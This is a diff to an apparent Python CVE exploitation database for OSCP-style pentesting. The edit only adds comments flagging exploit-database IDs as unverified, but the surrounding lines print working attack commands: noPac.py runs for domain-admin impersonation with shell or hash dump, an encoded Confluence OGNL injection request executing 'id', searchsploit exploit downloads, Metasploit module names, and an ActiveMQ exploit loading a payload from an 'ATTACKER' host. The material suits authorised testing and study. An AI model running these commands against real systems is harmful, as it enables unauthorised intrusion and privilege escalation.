@@ -205,7 +205,7 @@ CVE_DATABASE: List[Dict[str, Any]] = [
             "searchsploit -m 49090",
             "# Kernel exploit — very crashy. Test on snapshot first.",
         ],
-        "searchsploit_id": "49090",
+        "searchsploit_id": "49090",  # TODO: verify EDB-ID
         "msf_module": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
         "oscp_note": "High BSOD risk; prefer just as evidence unless shell is critical.",
         "references": [
@@ -257,7 +257,7 @@ CVE_DATABASE: List[Dict[str, Any]] = [
             "# Or noPac.py:",
             "python3 noPac.py {domain}/{user}:'{pass}' -dc-ip {ip} --impersonate administrator -use-ldap -shell",
         ],
-        "searchsploit_id": "51212",
+        "searchsploit_id": "51212",  # TODO: verify EDB-ID
         "msf_module": None,
         "oscp_note": "Any domain user → DA. Chains with CVE-2021-42287.",
         "references": [
@@ -280,7 +280,7 @@ CVE_DATABASE: List[Dict[str, Any]] = [
             "# Chain with CVE-2021-42278 via noPac.py:",
             "python3 noPac.py {domain}/{user}:'{pass}' -dc-ip {ip} --impersonate administrator -use-ldap -dump",
         ],
-        "searchsploit_id": "51212",
+        "searchsploit_id": "51212",  # TODO: verify EDB-ID
         "msf_module": None,
         "oscp_note": "Pair with CVE-2021-42278 — same exploit chain reports both.",
         "references": [
@@ -384,7 +384,7 @@ CVE_DATABASE: List[Dict[str, Any]] = [
             "searchsploit -m 49521",
             "# Blasty PoC: https://github.com/blasty/CVE-2021-3156",
         ],
-        "searchsploit_id": "49521",
+        "searchsploit_id": "49521",  # TODO: verify EDB-ID
         "msf_module": None,
         "oscp_note": "LPE via sudo heap overflow. Check sudo --version first.",
         "references": [
@@ -607,7 +607,7 @@ CVE_DATABASE: List[Dict[str, Any]] = [
             "# PoC: https://github.com/craig/SpringCore0day",
             "# Needs DataBinder binding + JDK >= 9 + WAR deployment.",
         ],
-        "searchsploit_id": "50868",
+        "searchsploit_id": "50868",  # TODO: verify EDB-ID
         "msf_module": "exploit/multi/http/spring_framework_rce_spring4shell",
         "oscp_note": "Multiple preconditions — confirm JDK >= 9 and WAR-packaged Tomcat.",
         "references": [
@@ -630,7 +630,7 @@ CVE_DATABASE: List[Dict[str, Any]] = [
             "curl -s 'http://{ip}:{port}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Out%22%2C%23a%29%29%7D/'",
             "searchsploit -m 50990",
         ],
-        "searchsploit_id": "50990",
+        "searchsploit_id": "50990",  # TODO: verify EDB-ID
         "msf_module": "exploit/multi/http/atlassian_confluence_namespace_ognl_injection",
         "oscp_note": "Exam-relevant if Confluence appears. Check X-Cmd-Out response header.",
         "references": [
@@ -678,7 +678,7 @@ CVE_DATABASE: List[Dict[str, Any]] = [
             "# Chain with CVE-2020-14883 for RCE via HandleFactory:",
             "searchsploit -m 48971",
         ],
-        "searchsploit_id": "48971",
+        "searchsploit_id": "48971",  # TODO: verify EDB-ID
         "msf_module": "exploit/multi/http/weblogic_deserialize_marshalledobject",
         "oscp_note": "Very noisy on reports — chain 14882 auth bypass with 14883 for RCE.",
         "references": [
@@ -703,7 +703,7 @@ CVE_DATABASE: List[Dict[str, Any]] = [
             "go run main.go -i {ip} -p {port} -u http://ATTACKER/poc.xml",
             "searchsploit -m 51830",
         ],
-        "searchsploit_id": "51830",
+        "searchsploit_id": "51830",  # TODO: verify EDB-ID
         "msf_module": "exploit/multi/misc/apache_activemq_rce_cve_2023_46604",
         "oscp_note": "Default port 61616 — unauth RCE via malicious Spring XML.",
         "references": [
